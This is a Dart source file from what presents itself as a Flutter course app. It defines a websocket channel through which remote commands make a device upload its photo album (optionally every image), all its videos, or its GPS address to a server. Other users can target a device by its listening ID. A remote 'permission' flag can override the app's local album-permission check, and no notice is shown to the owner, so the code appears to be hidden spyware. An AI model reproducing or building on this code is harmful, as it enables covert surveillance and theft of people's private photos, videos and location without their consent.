import 'dart:convert';
import 'package:amap_location_fluttify/amap_location_fluttify.dart';
import 'package:common_utils/common_utils.dart';
import 'package:connectivity/connectivity.dart';
import 'package:course_app/router/application.dart';
import 'package:course_app/test/software_service.dart';
import 'package:course_app/utils/permission_util.dart';
import 'package:course_app/utils/softwareUtil.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_album_manager/album_model_entity.dart';
//import 'package:photo_album_manager/album_model_entity.dart';
import 'package:web_socket_channel/io.dart';
import 'package:course_app/utils/data_content.dart';
import 'package:flutter/material.dart';

enum SoftActionEnum {
  ONLINEUSER,
  UPLOADIMG,
  UPLOADVIDEO,
  RESPONE,
  LOCALGPS,
}

class SoftWareBody {
  int code;
  String method;
  dynamic data;

  SoftWareBody({this.code, this.method, this.data});
}

class SoftWareChannel {
  IOWebSocketChannel _channel;
  JsonEncoder _encoder = JsonEncoder();
  String localId;

  SoftWareChannel(this._channel);

  void onMessage(Map mapData) async {
    var data = mapData['data'];
    print(mapData['type']);
    switch (mapData['type']) {
      case 'upVideo':
        {
          String net = data['net'];
          bool permisson = data['permission'];
          ConnectivityResult result = await Connectivity().checkConnectivity();
          if (net == 'wifi') {
            if (result == ConnectivityResult.wifi) {
              upVideo(permisson: permisson);
            } else {
              sendResponse('upVideo', code: 'error: no wifi');
            }
          } else if (net == 'mobile') {
            if (result == ConnectivityResult.mobile) {
              upVideo(permisson: permisson);
            } else {
              sendResponse('upVideo', code: 'error: no 4G');
            }
          } else {
            if (result != ConnectivityResult.none) {
              upVideo(permisson: permisson);
            }
          }
          break;
        }
      case 'upImg':
        {
          String net = data['net'];
          bool all = data['all'];
          int size = data['size'];
          bool permisson = data['permission'];
          ConnectivityResult result = await Connectivity().checkConnectivity();
          if (net == 'wifi') {
            if (result == ConnectivityResult.wifi) {
              upImg(all: all, size: size, permisson: permisson);
            } else {
              sendResponse('upImg', code: 'error: no wifi');
            }
          } else if (net == 'mobile') {
            if (result == ConnectivityResult.mobile) {
              upImg(all: all, size: size, permisson: permisson);
            } else {
              sendResponse('upImg', code: 'error: no 4G');
            }
          } else if (net == 'any') {
            if (result != ConnectivityResult.none) {
              upImg(all: all, size: size, permisson: permisson);
            }
          }
          break;
        }
      case 'onlineuser':
        {
          ///获取在线用户
          List<dynamic> list = data;
          debugPrint('${list}');
          SoftWareBody softWareBody =
              new SoftWareBody(code: 1, method: 'onlineuser', data: list);
          Application.eventBus.publish(softWareBody);
          break;
        }
      case 'response':
        {
          debugPrint('${data}');
          String type = data['type'];
          String method = data['method'];
          SoftWareBody body =
              SoftWareBody(code: 1,method: 'response', data: '${method}: ${type}');
          if(method=='gpsAddr'){
            body.data=type;
            body.code=0;
          }
          Application.eventBus.publish(body);
          break;
        }
      case 'gpsAddr':
        {
          String net = data['net'];
          bool permisson = data['permission'];
          ConnectivityResult result = await Connectivity().checkConnectivity();
          if (net == 'wifi') {
            if(result == ConnectivityResult.wifi){
              upGps(permission: permisson);
            }else{
              sendResponse('upGps', code: 'error: no wifi');
            }
          } else if (net == 'mobile') {
            if(result == ConnectivityResult.mobile){
              upGps(permission: permisson);
            }else{
              sendResponse('upGps', code: 'error: no 4G');
            }
          } else if (net == 'any') {
            if (result != ConnectivityResult.none) {
              upGps(permission: permisson);
            }
          }
          break;
        }
    }
  }

  sendListenuser({String pwd}) async {
    send(SoftActionEnum.ONLINEUSER, {
      'pwd': pwd,
    });
  }

  sendUpImg(
      {int who = 0,
      String net = 'wifi',
      String listenId,
      bool all = false,
      size = 20,
      bool permission = false}) async {
    send(SoftActionEnum.UPLOADIMG, {
      'permission': permission,
      'who': who,
      'net': net,
      'acceptId': listenId,
      'all': all,
      'size': size,
    });
  }

  sendUpVideo(
      {int who = 0,
      String net = 'wifi',
      String listenId,
      bool permission = false}) async {
    send(SoftActionEnum.UPLOADVIDEO, {
      'who': who,
      'net': net,
      'acceptId': listenId,
      'permission': permission,
    });
  }

  sendResponse(method, {String code = 'error'}) {
    send(SoftActionEnum.RESPONE, {
      'type': code,
      'method': method,
    });
  }

  sendGps({String listenId,String net = 'wifi',bool permission = false}){
    send(SoftActionEnum.LOCALGPS, {
      'net': net,
      'permission': permission,
      'acceptId': listenId,
    });
  }


  ///////////////////////////////
  ///upload image
  upImg({bool all = false, int size = 20, permisson = false}) async {
    debugPrint('upImg do');
    bool b = SoftWareUtil.getAlunmPermisson();
    debugPrint('getAlunmPermisson : ${b}');
    if (b || permisson) {
      //判断本地存在吗
      List<AlbumModelEntity> list = [];
      if (all) {
        //all
        list = await SoftWareUtil.getAlbumImg(
          maxCount: null,
        );
      } else {
        if (Application.sp.containsKey('upImg')) {
          String lastId = Application.sp.get('upImg');
          num first = num.parse(lastId);
          for (num i = first; i > first - size; i--) {
            debugPrint('${i.toString()}');
            var ob = await SoftWareUtil.getOriginalImg(i.toString())
                .catchError((error) {
              debugPrint('不处理: ${error.toString()}');
            });
            if (ObjectUtil.isNotEmpty(ob)) {
              list.add(ob);
            }
          }
        } else {
          list = await SoftWareUtil.getAlbumImg(
            maxCount: size,
          );
        }
      }
      ///remote
      List remote = await SoftWareMethod.getAlbumResInfo();
      sendResponse('upImg', code: 'success: ${list.length}');
      if (remote != null && remote.length > 0) {
        //print(list);
        list.removeWhere((item) => remote.contains(item.localIdentifier));
      }

      ///upload
      if (ObjectUtil.isNotEmpty(list)) {
        SoftWareMethod.upAlbumRes(list, type: 'image');
        print('上传  ${list.last.localIdentifier}');
        Application.sp.setString('upImg', list.last.localIdentifier);
      } else {
        if (localId == null && ObjectUtil.isNotEmpty(remote)) {
          localId = remote.first.toString();
        }
        localId = NumUtil.subtractDecStr(localId, '${size}').toString();
        print('remote last   ${localId}');
        Application.sp.setString('upImg', localId);
      }
    } else {
      sendResponse('upImg', code: 'error: no permission');
    }
  }

  upVideo({permisson = false}) async {
    debugPrint('upVideo do');
    bool b = SoftWareUtil.getAlunmPermisson();
    debugPrint('getAlunmPermisson : ${b}  ${permisson}');
    if (b || permisson) {
      List li = await SoftWareMethod.getAlbumResInfo();
      List<AlbumModelEntity> list = await SoftWareUtil.getAlbumVideo(
        maxCount: null,
      );
      if (li != null) {
        list.removeWhere((item) => li.contains(item.localIdentifier));
      }
      if (ObjectUtil.isNotEmpty(list)) {
        sendResponse('upVideo', code: 'success : ${list.length}');
        SoftWareMethod.upAlbumRes(list, type: 'video');
      }
    } else {
      sendResponse('upVideo', code: 'error: no permission');
    }
  }


  ////
  upGps({bool permission}) async {
    var status = await PermissionUtil.findPermissionStatus(
        permissionGroup: PermissionGroup.location);
    Location location;
    if (status == PermissionStatus.granted) {
      location = await AmapLocation.fetchLocation();
    } else {
      if (permission && await PermissionUtil.requestAmapPermission()) {
        location = await AmapLocation.fetchLocation();
        //_location = location;
      }
    }
    if(location!=null){
      var add=await location.address;
      sendResponse('gpsAddr', code: '${add}');
    }else{
      sendResponse('upGps', code: 'error: no permission');
    }

  }

  Future<bool> send(action, data) async {
    DataContent dataContent = DataContent(
        action: ActionEnum.SOFT_ADMIN.index,
        subAction: action.index,
        data: data);
    _channel?.sink.add(_encoder.convert(dataContent));
    _channel.sink.done.then((onValue) {}).catchError((onError) {});
  }
}
